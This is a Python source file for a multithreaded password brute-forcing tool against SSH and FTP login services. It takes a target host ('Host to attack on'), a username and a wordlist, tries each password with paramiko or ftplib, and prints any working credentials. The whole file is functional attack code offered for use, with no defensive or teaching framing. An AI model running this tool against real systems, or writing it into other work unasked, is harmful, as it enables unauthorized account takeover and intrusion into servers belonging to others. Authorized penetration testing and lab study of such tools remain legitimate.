# Paramiko is a ssh-2 implementation for SSHv2 protocol,this provides all the client and server side functionalities !
#
import paramiko
import argparse
import ftplib
from datetime import datetime

# termcolor can be used to make text in terminal colorful!
from termcolor import colored

# imported to check if workslist location does exist or not !
from os import path

# for multi threading
from threading import Thread
from queue import Queue

# for exiting the program
from sys import exit

#  Creating command-line arguments


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', type=int, required=False,
                        help="Port to attack on, Default:22 for ssh and 21 for Ftp")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                        required=True, type=str)
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username with which bruteforce to ")
    parser.add_argument('-t', '--threads', dest='threads', required=False, default=4,
                        type=int, help="Specify the thread to use ,Default:4,supports 8 threads ")
    parser.add_argument('-ftp', dest='ftp', required=False,
                        action="store_true", help="Specify for Ftp")
    parser.add_argument('-ssh', dest='ssh', required=False,
                        action='store_true', help="Specify it for SSH")

    arguments = parser.parse_args()

    if not (arguments.ftp or arguments.ssh):
        print(colored(f"[-] Please Choose one of the protocols "))
        parser.print_usage()
        exit(1)

    return arguments


def ssh_bruteforce(host, username, password, port):
    global q
    # creating a sshclient object with paramiko !
    ssh = paramiko.SSHClient()
    # Configuring to auto add any missing policy if found !
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # trying to  connect
        ssh.connect(host, port=port, username=username,
                    password=password, banner_timeout=800)
    except:
        print(
            f"[Attempt] target {host} - login:{username} - password:{password}")
    else:
        print(colored(
            f"[{port}] [ssh] host:{host}  login:{username}  password:{password}\n", 'green'))
        # clearing the all the queue as the password is found ~
        with q.mutex:
            q.queue.clear()
            # Marking all the tasks as done
            q.all_tasks_done.notify_all()
            # setting unfinished tasks to 0
            q.unfinished_tasks = 0
    finally:
        # After all the work closing the connection
        ssh.close()


def ftp_bruteforce(host, username, password, port):
    # Creating a ftp client object !
    ftp = ftplib.FTP()
    try:
        # Trying connecting to the ftp
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)
    except ftplib.error_perm:
        print(
            f"[Attempt] target {host} - login:{username} - password:{password}")
    except:
        print(
            f"[Attempt] target {host} - login:{username} - password:{password}")
    else:
        print(colored(
            f"[{port}] [ftp] host:{host}  login:{username}  password:{password}\n", 'green'))
        with q.mutex:
            # clearing the queue
            q.queue.clear()
            q.all_tasks_done.notify_all()
            q.unfinished_tasks = 0


def bruteforce(host, port, username, protocol):
    global q
    while True:
        try:
            password = q.get()
            if protocol == 'ssh':
                ssh_bruteforce(host, username, password, port)
            elif protocol == 'ftp':
                ftp_bruteforce(host, username, password, port)
            q.task_done()
        except:
            pass


def main(host, port, username, wordlist, threads, protocol):

    global q

    passwords = []

    with open(wordlist, 'r') as f:

        for password in f.readlines():

            password = password.strip()

            passwords.append(password)
    try:
        for thread in range(threads):

            thread = Thread(target=bruteforce, args=(
                host, port, username, protocol))

            thread.daemon = True

            thread.start()
    except:
        pass
    for password in passwords:
        q.put(password)

    q.join()


if __name__ == "__main__":

    arguments = get_args()

    q = Queue()

    if not path.exists(arguments.wordlist):
        print(colored("[-] Wordlist doesn't exist", 'red'))
        exit(1)
    if arguments.ssh:
        if not arguments.port:
            arguments.port = 22
        print("\n---------------------------------------------------------\n---------------------------------------------------------")
        print(f"[*] Target\t: {arguments.target}")
        print(f"[*] Port\t: {'22' if not arguments.port else arguments.port}")
        print(f"[*] Threads\t: {arguments.threads}")
        print(f"[*] Wordlist\t: {arguments.wordlist}")
        print(f"[*] Protocol\t: {'ssh' if arguments.ssh else 'ftp'}")
        print("---------------------------------------------------------\n---------------------------------------------------------")
        print(colored(
            f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
        print("---------------------------------------------------------\n---------------------------------------------------------")
        main(arguments.target, arguments.port, arguments.username,
             arguments.wordlist, arguments.threads, 'ssh')
    elif arguments.ftp:
        if not arguments.port:
            arguments.port = 21
        print("\n---------------------------------------------------------\n---------------------------------------------------------")
        print(f"[*] Target\t: {arguments.target}")
        print(f"[*] Port\t: {'22' if not arguments.port else arguments.port}")
        print(f"[*] Threads\t: {arguments.threads}")
        print(f"[*] Wordlist\t: {arguments.wordlist}")
        print(f"[*] Protocol\t: {'ftp' if arguments.ftp else 'ssh'}")
        print("---------------------------------------------------------\n---------------------------------------------------------")
        print(colored(
            f"Ftp Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
        print("---------------------------------------------------------\n---------------------------------------------------------")
        main(arguments.target, arguments.port, arguments.username,
             arguments.wordlist, arguments.threads, 'ftp')
